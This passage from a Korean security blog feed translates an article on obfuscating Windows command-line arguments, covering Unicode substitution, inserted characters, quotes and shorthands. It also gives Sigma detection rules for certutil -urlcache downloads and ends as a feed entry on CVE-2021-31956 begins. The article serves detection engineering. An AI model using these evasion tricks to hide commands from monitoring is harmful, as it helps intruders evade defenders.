&#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xC2AC;&#xB798;&#xC2DC;&#xB3C4; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;.</p><p>&#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xB300;&#xCCB4;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; command-line option&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xBB38;&#xC11C;&#xD654;&#xB97C; &#xC798; &#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xBB34;&#xCC28;&#xBCC4; &#xB300;&#xC785; (brute force)&#xB098; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD1B5;&#xD574; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD55C;&#xB2E4;.</p><h2 id="Character-substitution"><a href="#Character-substitution" class="headerlink" title="Character substitution"></a>Character substitution</h2><p>&#xB610; &#xB2E4;&#xB978; &#xC811;&#xADFC;&#xBC95;&#xC740; command line&#xC5D0; &#xC788;&#xB294; &#xB2E4;&#xB978; &#xBB38;&#xC790; (option char&#xAC00; &#xC544;&#xB2CC; &#xBB38;&#xC790;)&#xB97C; &#xBE44;&#xC2B7;&#xD55C; &#xBB38;&#xC790;&#xB85C; &#xBC14;&#xAFB8;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xD2B9;&#xD788; &#xC720;&#xB2C8;&#xCF54;&#xB4DC;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xACE0;&#xB824;&#xD560; &#xB54C; ASCII &#xBC94;&#xC704;&#xC5D0;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xBB38;&#xC790;&#xAC00; &#xC788;&#xB2E4;.</p><p>&#xC720;&#xB2C8;&#xCF54;&#xB4DC;&#xC5D0;&#xB294; &#xACF5;&#xBC31; &#xBB38;&#xC790; (0x02B0 ~ 0x02FF)&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xACE0;, &#x2EA;, &#x2E3;, &#x2E2; &#xAC19;&#xC740; &#xBB38;&#xC790;&#xB3C4; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;. &#xC77C;&#xBD80; command-line parser&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; l, x, s&#xB85C; &#xBCC0;&#xD658;&#xD55C;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; <code>reg export HKCU out.reg</code>&#xC640; <code>reg e&#x2E3;port HKCU out.reg</code>&#xB294; &#xAC19;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%201.png" alt></p><blockquote><p><code>e&#x2E3;port HKCU out.reg</code>&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC608;&#xC2DC;</p></blockquote><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBC94;&#xC704;&#xAC00; &#xB354; &#xB9CE;&#xC544;&#xC84C;&#xB2E4;.</p><h2 id="Character-insertion"><a href="#Character-insertion" class="headerlink" title="Character insertion"></a>Character insertion</h2><p>&#xBE44;&#xC2B7;&#xD55C; &#xB9E5;&#xB77D;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBB34;&#xC2DC;&#xD558;&#xB294; &#xBB38;&#xC790;&#xB97C; command-line&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC77C;&#xBD80; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC740; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xBA70; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><p>Windows &#xC774;&#xBCA4;&#xD2B8; &#xB85C;&#xADF8; &#xD234; <code>wevtutil</code>&#xC740; &#xD2B9;&#xC815; &#xBC94;&#xC704;&#xC758; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;. <code>wevtutil gli hardwareevents</code>&#xC640; <code>wevtutil g&#x8AF;li hardwareevents</code>&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; &#xC911;&#xAC04;&#xC5D0; &#xC544;&#xB78D;&#xC5B4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xCD9C;&#xB825;&#xD55C;&#xB2E4;. </p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%202.png" alt></p><blockquote><p><code>wevtutil g&#x8AF;li hardwareevents</code>&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC608;&#xC2DC;</p></blockquote><p>&#xC774; &#xAE30;&#xBC95;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC790;&#xAC00; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC758; stdin&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xBC14;&#xC774;&#xD2B8; &#xD45C;&#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBB38;&#xC790;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><h2 id="Quotes-insertion"><a href="#Quotes-insertion" class="headerlink" title="Quotes insertion"></a>Quotes insertion</h2><p>quote &#xC30D;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD750;&#xB984;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xBA74;&#xC11C; command-line&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC778;&#xC790;&#xC5D0; quote&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC775;&#xC219;&#xD560; &#xAC83;&#xC774;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>dir &quot;C:\Windows\&quot;</code>&#xB294; <code>dir c:\Windows\</code>&#xC640; &#xAC19;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC774;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBA70; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0;&#xC11C; quote&#xB97C; &#xBC1B;&#xC544;&#xB4E4;&#xC778;&#xB2E4;. <code>dir c:&quot;win&quot;d&quot;&quot;ow&quot;s&quot;</code>&#xB3C4; &#xC791;&#xB3D9;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%203.png" alt></p><blockquote><p><code>netsh ad&quot;vfi&quot;rewall show currentprofile state</code>&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC608;&#xC2DC;</p></blockquote><p>&#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; quote&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xC5EC; &#xAE4C;&#xB2E4;&#xB85C;&#xC6B8; &#xC218; &#xC788;&#xB2E4;. cmd&#xC5D0;&#xC11C; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBAA8;&#xB4E0; quote&#xB97C; &#xB450; &#xBC30;&#xB85C; &#xB298;&#xB824; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs jsx">netsh ad<span class="hljs-string">&quot;&quot;</span>vfi<span class="hljs-string">&quot;&quot;</span>rewall show currentprofile state</code></pre><h2 id="Shorthands"><a href="#Shorthands" class="headerlink" title="Shorthands"></a>Shorthands</h2><p>&#xBB38;&#xC790;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xACE0; &#xAD50;&#xCCB4;&#xD558;&#xACE0; &#xB098;&#xBA74; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC77C;&#xBD80; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#x2018;shorthands&#x2019;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xC27D;&#xAC8C; &#xC785;&#xB825;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xC774;&#xB294; Unix &#xACC4;&#xC5F4; &#xD234;&#xC5D0;&#xC11C;&#xB294; &#xC798; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC9C0;&#xB9CC; Windows&#xC5D0;&#xB294; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;. (<code>grep -i keyword</code> vs <code>grep --ignore-case keyword</code>) &#xD558;&#xC9C0;&#xB9CC; Windows&#xC758; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E8;&#xCD95;&#xC5B4;&#xAC00; &#xC788;&#xB2E4;. Unix&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC744; &#xD1B5;&#xD574; &#xD55C; &#xAE00;&#xC790;&#xB85C; &#xC904;&#xC774;&#xBA70; (<code>cmdkey /l</code> , <code>cmdkey /list</code>), &#xC57D;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. (<code>wevtutil gli</code>, <code>wevtutil get-loginfo</code>) &#xB610; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; wildcard &#xC811;&#xADFC;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. Powershell&#xC744; &#xC608;&#xB85C; &#xB4E4;&#xBA74; powershell&#xC758; &#xD0A4;&#xC6CC;&#xB4DC; &#xB05D;&#xC5D0; &#xD558;&#xB098; &#xC774;&#xC0C1;&#xC758; &#xBB38;&#xC790;&#xB97C; &#xB0A8;&#xAE38; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%204.png" alt></p><blockquote><p>13 &#xAC00;&#xC9C0;&#xC758; &#xB2E4;&#xB978; shorthand&#xAC00; &#xC788;&#xB2E4;.</p></blockquote><p>&#xC18C;&#xC218;&#xC758; &#xC0AC;&#xB78C;&#xB4E4;&#xB9CC;&#xC774; &#xC774;&#xB97C; &#xC774;&#xD574;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD558;&#xACE0;, &#xB098;&#xBA38;&#xC9C0;&#xB294; &#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9C4;&#xB2E4;. Powershell&#xC740; &#xB2E4;&#xB978; &#xBA85;&#xB839; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xBAA8;&#xD638;&#xC131;&#xC774; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xB2E8;&#xCD95;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. <code>/noprofile</code>&#xC758; &#xAC00;&#xC7A5; &#xC9E7;&#xC740; &#xB2E8;&#xCD95;&#xC740; <code>/no</code>&#xB294; <code>/noexit</code>&#xC640; &#xCDA9;&#xB3CC; &#xB54C;&#xBB38;&#xC5D0; <code>/nop</code>&#xC774;&#xB2E4;. Powershell&#xC758; &#xACBD;&#xC6B0; &#xC55E;&#xC758; &#xB450; &#xBB38;&#xC790;&#xB85C; &#xCD95;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <code>/ec</code>&#xB3C4; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><h1 id="&#xB09C;&#xB3C5;&#xD654;&#xB41C;-command-line&#xC774;-&#xC788;&#xB294;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-&#xCC3E;&#xAE30;"><a href="#&#xB09C;&#xB3C5;&#xD654;&#xB41C;-command-line&#xC774;-&#xC788;&#xB294;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-&#xCC3E;&#xAE30;" class="headerlink" title="&#xB09C;&#xB3C5;&#xD654;&#xB41C; command line&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCC3E;&#xAE30;"></a>&#xB09C;&#xB3C5;&#xD654;&#xB41C; command line&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCC3E;&#xAE30;</h1><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C;&#xB300;&#xB85C; command line &#xC778;&#xC790;&#xB97C; &#xD578;&#xB4E4;&#xB9C1;&#xD558;&#xB294;&#xB370; &#xD45C;&#xC900;&#xC774; &#xC5C6;&#xB2E4;. &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC5C4;&#xACA9;&#xD558;&#xC9C0;&#xB9CC; &#xC5B4;&#xB5A4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC720;&#xC5F0;&#xD558;&#xB2E4;. &#xD2B9;&#xC815;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; command line&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xB3C4; &#xBB38;&#xC81C;&#xB2E4;. </p><p>&#xC774;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC00;&#xC7A5; &#xD655;&#xC2E4;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xB9AC;&#xBC84;&#xC2F1;&#xC774;&#xC9C0;&#xB9CC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBCF5;&#xC7A1;&#xD568;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC2DC;&#xAC04;&#xC774; &#xB9CE;&#xC774; &#xB4E0;&#xB2E4;. &#xC880; &#xB354; &#xD6A8;&#xACFC;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC740; &#xBAA8;&#xB4E0; &#xC6B0;&#xD68C; &#xAE30;&#xBC95;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774; &#xC811;&#xADFC;&#xBC95;&#xC758; PoC &#xAD6C;&#xD604;&#xC744; &#xD1B5;&#xD574; &#xC704;&#xC758; &#xB2E4;&#xC12F; &#xAC00;&#xC9C0; &#xAE30;&#xBC95; &#xC911; &#xC5B4;&#xB290; &#xAC83;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB2E4;. PoC&#xC758; &#xC790;&#xC138;&#xD55C; &#xC124;&#xBA85;&#xC740; <a href="https://github.com/wietze/windows-command-line-obfuscation">github</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection-1"><a href="#&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection-1" class="headerlink" title="&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)"></a>&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)</h1><p>&#xD2B9;&#xC815; command line &#xC778;&#xC790;&#xAC00; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xB824;&#xBA74; synonymous command-line &#xC778;&#xC790;&#xAC00; &#xBB38;&#xC81C;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; <code>urlcache</code>&#xC640; <code>f</code> &#xC778;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>certutil</code> &#xC2E4;&#xD589; &#xD0D0;&#xC9C0; Sigma &#xB8F0;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs less"><span class="hljs-attribute">detection</span>:    <span class="hljs-attribute">selection</span>:        <span class="hljs-attribute">Image</span>: <span class="hljs-string">&quot;*\\certutil.exe&quot;</span>        CommandLine|contains|<span class="hljs-attribute">all</span>:            - <span class="hljs-string">&quot;/urlcache&quot;</span>            - <span class="hljs-string">&quot;/f&quot;</span>    <span class="hljs-attribute">condition</span>: selection</code></pre><p>&#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, &#xD574;&#xCEE4;&#xAC00; <code>urlcache</code>, <code>/ur&#x1D38;cache</code>, <code>/&#x209E;urlcache</code>, <code>/url&quot;cach&quot;e</code>, &#xD30C;&#xBA78;&#xC801;&#xC73C;&#xB85C; <code>&#x209E;u&#x209E;r&#x1D38;&quot;c&#x209E;a&#x209E;ch&quot;e</code> &#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; command&#xB294; &#xB3D9;&#xC791;&#xD558;&#xC9C0;&#xB9CC; &#xD589;&#xC704;&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC5C6;&#xB2E4;. &#xADDC;&#xCE59;&#xC5D0; &#xBAA8;&#xB4E0; &#xBCC0;&#xD615;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xBD88;&#xAC00;&#xB2A5;&#xD55C;&#xB370;, &#xB2E4;&#xC591;&#xD55C; &#xC6B0;&#xD68C; &#xAE30;&#xBC95;&#xC744; &#xC870;&#xD569;&#xD558;&#xBA74; &#xC218;&#xBC31;&#xB9CC; &#xAC1C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%205.png" alt></p><blockquote><p><code>certutil -f -urlcache -split [https://wietze.github.io/robots.txt](https://wietze.github.io/robots.txt) output.txt</code>&#xC758; &#xB09C;&#xB3C5;&#xD654; &#xBC84;&#xC804;</p></blockquote><p>&#xC2DC;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD55C; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC740; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xADDC;&#xCE59;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC774;&#xB2E4;. option char&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs less"><span class="hljs-attribute">detection</span>:    <span class="hljs-attribute">selection</span>:        <span class="hljs-attribute">Image</span>: <span class="hljs-string">&quot;*\\certutil.exe&quot;</span>        CommandLine|contains|<span class="hljs-attribute">all</span>:            - <span class="hljs-string">&quot;urlcache&quot;</span>            - <span class="hljs-string">&quot;f&quot;</span>    <span class="hljs-attribute">condition</span>: selection</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC644;&#xBCBD;&#xD55C; &#xD574;&#xACB0;&#xCC45;&#xC740; &#xC544;&#xB2CC;&#xB370;, <code>f</code>&#xB9CC; &#xCC3E;&#xB294; &#xAC70;&#xB294; &#xC624;&#xD0D0;&#xB960;&#xC774; &#xB9CE;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xD655;&#xB960;&#xC774; &#xC788;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xBC29;&#xBC95;&#xC740; matching option&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xB294; &#xB9CE;&#xC740; EDR &#xB3C4;&#xAD6C;&#xB294; &#xC704;&#xC758; &#xC608;&#xC2DC;&#xC640; &#xAC19;&#xC774; &#xB2E8;&#xC21C;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xD3EC;&#xD568; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB294; &#xB4DC;&#xBB3C;&#xB2E4;. Sigma&#xAC00; regex&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; 30&#xAC1C; &#xC911; 7&#xAC1C;&#xB9CC; &#xAD6C;&#xD604;&#xD55C;&#xB2E4;. &#xC81C;&#xC870; &#xC5C5;&#xCCB4;&#xAC00; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC774; &#xC635;&#xC158;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC774;&#xC720;&#xB294; &#xC131;&#xB2A5; &#xB54C;&#xBB38;&#xC774;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD234;&#xC758; &#xACBD;&#xC6B0; option char &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs less"><span class="hljs-attribute">detection</span>:    <span class="hljs-attribute">selection</span>:        <span class="hljs-attribute">Image</span>: <span class="hljs-string">&quot;*\\certutil.exe&quot;</span>        CommandLine|<span class="hljs-attribute">re</span>: <span class="hljs-string">&quot;^(?=.*[-/\\]urlcache)(?=.*[-/\\]f).+.*&quot;</span>    <span class="hljs-attribute">condition</span>: selection</code></pre><p>&#xC815;&#xADDC;&#xC2DD;&#xC740; &#xB610; shorthand&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC9C0;&#xB9CC;, character instertion&#xACFC; substituion&#xC740; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><h1 id="Robust-and-resilient-detctions"><a href="#Robust-and-resilient-detctions" class="headerlink" title="Robust and resilient detctions"></a>Robust and resilient detctions</h1><p>&#xADDC;&#xCE59;&#xC744; &#xD569;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xB113;&#xAC8C; &#xC815;&#xC758;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xBCC0;&#xD615;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xACE0; &#xC624;&#xD0D0;&#xB960;&#xC744; &#xACE0;&#xB824;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. PoC&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xADDC;&#xCE59;&#xC774; &#xD5C8;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB450;&#xBC88;&#xC9F8;&#xB85C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xD234;&#xC758; &#xCD9C;&#xB825;&#xC744; &#xD45C;&#xC900;&#xD654;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xB3C4;&#xC6C0;&#xC774; &#xB41C;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xAC00; &#xBD84;&#xC11D; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xBA74; &#xBAA8;&#xB4E0; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; ASCII&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xACE0; &#xC54C;&#xD30C;&#xBCB3;&#xC774; &#xC544;&#xB2CC; &#xBAA8;&#xB4E0; &#xAC12;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xD544;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xC88B;&#xB2E4;.</p><p>&#xB610; &#xB370;&#xC774;&#xD130; &#xBD84;&#xC11D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB09C;&#xB3C5;&#xD654; &#xC2DC;&#xB3C4; &#xC790;&#xCCB4;&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xB2E4;. IT &#xC804;&#xBC18;&#xC5D0; &#xC0AC;&#xC6A9;&#xB960;&#xC774; &#xB0AE;&#xC740; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB41C; command line&#xC744; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xBB38;&#xC790; &#xBC00;&#xB3C4;, ASCII&#xAC00; &#xC544;&#xB2CC; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC778;&#xC790; &#xD0D0;&#xC9C0; &#xB4F1;&#xC774; &#xB3C4;&#xC6C0;&#xC774; &#xB41C;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/cmd/">cmd</category>
      
      <category domain="https://hackyboiz.github.io/tags/obfuscation/">obfuscation</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/01/idioth/windows_cmd_obfuscation/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) – Part 1</title>
      <link>https://hackyboiz.github.io/2021/07/30/j0ker/2021-07-30/</link>
      <guid>https://hackyboiz.github.io/2021/07/30/j0ker/2021-07-30/</guid>
      <pubDate>Fri, 30 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://research.nccgroup.com/2021/07/15/cve-2021-3</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&lt; Windows 10 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2021-31956&#xC740; &#xCE74;&#xC2A4;&#xD37C;&#xC2A4;&#xD0A4;&#xAC00; 5&#xC6D4;&#xC5D0; &#xC2E4;&#xC81C; 